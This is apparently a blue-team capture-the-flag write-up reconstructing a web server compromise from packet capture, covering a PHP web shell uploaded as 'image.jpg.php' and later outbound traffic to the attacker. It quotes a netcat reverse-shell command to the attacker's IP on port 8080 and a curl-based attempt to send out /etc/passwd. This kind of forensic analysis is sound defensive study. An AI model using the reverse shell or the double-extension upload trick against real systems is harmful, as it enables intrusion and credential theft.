# WebStrike – PCAP Analysis (CyberDefenders)

## Objective
Analyze network traffic to identify attacker activity, exploitation method, reverse shell behavior, and attempted data exfiltration.

## Scenario
The exercise is based on a PCAP containing HTTP and TCP traffic related to a compromised web application.
The objective is to reconstruct the attack chain from packet data and identify the main actions performed by the attacker.

## References
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/VonFaFiller/webstrike/  
https://cyberdefenders.org/walkthroughs/webstrike/

## Observations
- The analysis was performed in Wireshark on the provided PCAP.
- Two main IP addresses were identified:
  - `117.11.88.124` as the attacker
  - `24.49.63.79` as the target web server
- Multiple HTTP requests from the attacker to the server were observed.
- A `POST` request to `/reviews/upload.php` indicated file upload functionality.
- Inspection of the HTTP stream revealed an uploaded file:
  - `filename="image.jpg.php"`
- The double extension suggested a PHP web shell disguised as an image file.
- Subsequent requests confirmed that the uploaded file was accessed:
  - `GET /reviews/uploads/image.jpg.php`
- The upload path was identified as:
  - `/reviews/uploads/`
- The uploaded payload contained a reverse shell command using netcat:
  - `nc 117.11.88.124 8080`
- TCP traffic on port `8080` confirmed outbound non-HTTP communication from the server to the attacker.
- Additional outbound HTTP traffic from the server used:
  - `User-Agent: curl/7.81.0`
- Inspection of the related POST body showed:
  - `/etc/passwd`
- This indicated an attempt to retrieve sensitive system account information from the compromised host.

## Result
- Attacker IP: `117.11.88.124`
- Target Server IP: `24.49.63.79`
- Attack Vector: file upload vulnerability
- Uploaded Web Shell: `image.jpg.php`
- Upload Directory: `/reviews/uploads/`
- Reverse Shell Port: `8080`
- Attempted Exfiltration Target: `passwd`

## Notes
- The exercise was useful for distinguishing between different stages of the attack:
  - upload
  - execution
  - reverse shell activity
  - exfiltration attempt
- The main analytical difficulty was separating:
  - normal HTTP requests
  - malicious HTTP requests
  - non-HTTP reverse shell traffic
- Another important distinction was between:
  - the uploaded file
  - the script used for upload
  - the file later targeted for exfiltration
- A useful improvement for future PCAP investigations is to track findings in real time instead of reconstructing them afterward.
